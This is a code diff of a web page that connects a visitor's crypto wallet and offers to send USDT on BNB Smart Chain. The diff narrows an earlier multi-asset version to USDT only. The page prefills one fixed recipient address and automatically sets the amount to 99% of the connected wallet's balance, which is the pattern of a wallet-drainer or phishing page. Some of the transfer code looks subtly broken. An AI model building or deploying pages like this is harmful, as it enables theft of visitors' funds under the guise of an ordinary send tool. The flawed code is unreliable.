@@ -3,28 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet & Send Funds</title>
+    <title>Connect Wallet & Send USDT</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 <body>
     <button id="connectWalletBtn">Connect Wallet</button>
     <div id="walletAddress"></div>
 
-    <h2>Send Funds</h2>
+    <h2>Send USDT (BEP-20)</h2>
     <label for="recipientAddress">Recipient Address:</label>
     <input type="text" id="recipientAddress" value="0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE"><br><br>
 
-    <label for="asset">Select Asset:</label>
-    <select id="asset">
-        <option value="bnb">BNB</option>
-        <option value="busd">BUSD (Example BEP-20 Stablecoin)</option>
-        <option value="usdt">USDT (Example BEP-20 Stablecoin)</option>
-        </select><br><br>
-
-    <label for="amount">Amount:</label>
+    <label for="amount">Amount (USDT):</label>
     <input type="number" id="amount" step="any"><br><br>
 
-    <button id="sendFundsBtn" disabled>Send Funds</button>
+    <button id="sendFundsBtn" disabled>Send USDT</button>
 
     <div id="transactionResult"></div>
 
@@ -34,16 +27,12 @@
             const walletAddressDiv = document.getElementById('walletAddress');
             const sendFundsBtn = document.getElementById('sendFundsBtn');
             const recipientAddressInput = document.getElementById('recipientAddress');
-            const assetSelect = document.getElementById('asset');
             const amountInput = document.getElementById('amount');
             const transactionResultDiv = document.getElementById('transactionResult');
 
             let connectedAccount = null;
             let provider = null;
-
-            // Example contract addresses for BUSD and USDT on BSC (REPLACE WITH ACTUAL ADDRESSES)
-            const busdContractAddress = '0xe9e7CEA3DedcAe846fa077101708178003cdE6a';
-            const usdtContractAddress = '0x55d398326f99059fF775485246999027B3197955';
+            const usdtContractAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT on BSC
 
             connectWalletBtn.addEventListener('click', async () => {
                 if (typeof window.ethereum !== 'undefined') {
@@ -53,12 +42,11 @@
                             connectedAccount = accounts[0];
                             walletAddressDiv.textContent = `Connected Wallet: ${connectedAccount.substring(0, 6)}...${connectedAccount.slice(-4)}`;
                             connectWalletBtn.textContent = 'Wallet Connected';
-                            connectWalletBtn.disabled = true;
                             sendFundsBtn.disabled = false;
                             provider = new ethers.providers.Web3Provider(window.ethereum);
                             console.log('Connected address:', connectedAccount);
-                            // Set initial 99% amount for the default asset
-                            updateSendAmount();
+                            // Set initial 99% USDT amount after connecting
+                            updateUSDTAmount();
                         } else {
                             walletAddressDiv.textContent = 'No accounts found. Please connect your wallet.';
                             sendFundsBtn.disabled = true;
@@ -77,32 +65,25 @@
                 }
             });
 
-            assetSelect.addEventListener('change', updateSendAmount);
-
-            async function getBalance(address, asset) {
+            async function getUSDTBalance(address) {
                 if (!provider || !address) return '0';
                 try {
-                    if (asset === 'bnb') {
-                        const balanceWei = await provider.getBalance(address);
-                        return ethers.utils.formatEther(balanceWei);
-                    } else if (asset === 'busd' || asset === 'usdt') {
-                        const tokenAddress = asset === 'busd' ? busdContractAddress : usdtContractAddress;
-                        const tokenContract = new ethers.Contract(tokenAddress, ['function balanceOf(address) view returns (uint256)', 'function decimals() view returns (uint8)'], provider);
-                        const balanceRaw = await tokenContract.balanceOf(address);
-                        const decimals = await tokenContract.decimals();
-                        return ethers.utils.formatUnits(balanceRaw, decimals);
-                    }
-                    return '0';
+                    const tokenContract = new ethers.Contract(usdtContractAddress, [
+                        'function balanceOf(address) view returns (uint256)',
+                        'function decimals() view returns (uint8)'
+                    ], provider);
+                    const balanceRaw = await tokenContract.balanceOf(address);
+                    const decimals = await tokenContract.decimals();
+                    return ethers.utils.formatUnits(balanceRaw, decimals);
                 } catch (error) {
-                    console.error('Error fetching balance:', error);
+                    console.error('Error fetching USDT balance:', error);
                     return '0';
                 }
             }
 
-            async function updateSendAmount() {
+            async function updateUSDTAmount() {
                 if (connectedAccount) {
-                    const selectedAsset = assetSelect.value;
-                    const balance = await getBalance(connectedAccount, selectedAsset);
+                    const balance = await getUSDTBalance(connectedAccount);
                     const amountToSend = parseFloat(balance) * 0.99;
                     amountInput.value = isNaN(amountToSend) ? '' : amountToSend.toString();
                 } else {
@@ -118,7 +99,6 @@
 
                 const recipientAddress = recipientAddressInput.value;
                 const amountToSend = amountInput.value;
-                const selectedAsset = assetSelect.value;
 
                 if (!recipientAddress || !amountToSend || isNaN(amountToSend) || parseFloat(amountToSend) <= 0) {
                     transactionResultDiv.textContent = 'Please enter a valid recipient address and amount.';
@@ -126,41 +106,21 @@
                 }
 
                 try {
-                    let txHash;
+                    const tokenContract = new ethers.Contract(usdtContractAddress, [
+                        'function transfer(address recipient, uint256 amount) external returns (bool)',
+                        'function decimals() view returns (uint8)'
+                    ], provider);
 
-                    if (selectedAsset === 'bnb') {
-                        const transactionParameters = {
-                            from: connectedAccount,
-                            to: recipientAddress,
-                            value: ethers.utils.parseEther(amountToSend).toHexString(), // Amount in Wei
-                            gas: '0x76c0',
-                            gasPrice: '0x9184e72a000',
-                        };
-                        txHash = await window.ethereum.request({
-                            method: 'eth_sendTransaction',
-                            params: [transactionParameters],
-                        });
-                    } else if (selectedAsset === 'busd' || selectedAsset === 'usdt') {
-                        const tokenContractAddress = selectedAsset === 'busd' ? busdContractAddress : usdtContractAddress;
-                        const tokenContract = new ethers.Contract(tokenContractAddress, [
-                            'function transfer(address recipient, uint256 amount) external returns (bool)',
-                            'function decimals() view returns (uint8)' // Need decimals for correct amount parsing
-                        ], provider);
+                    const decimals = await tokenContract.decimals();
+                    const amountToSendWei = ethers.utils.parseUnits(amountToSend, decimals).toHexString();
 
-                        const decimals = await tokenContract.decimals();
-                        const amountToSendWei = ethers.utils.parseUnits(amountToSend, decimals).toHexString();
+                    const txHash = await tokenContract.transfer(recipientAddress, amountToSendWei);
 
-                        txHash = await tokenContract.transfer(recipientAddress, amountToSendWei);
-                    } else {
-                        transactionResultDiv.textContent = 'Unsupported asset selected.';
-                        return;
-                    }
-
-                    transactionResultDiv.textContent = `Transaction sent: https://bscscan.com/tx/${txHash}`; // Use BSCScan for BSC network
+                    transactionResultDiv.textContent = `Transaction sent: https://bscscan.com/tx/${txHash}`;
                     console.log('Transaction Hash:', txHash);
 
                 } catch (error) {
-                    console.error('Error sending transaction:', error);
+                    console.error('Error sending USDT transaction:', error);
                     transactionResultDiv.textContent = `Transaction failed: ${error.message}`;
                 }
             });
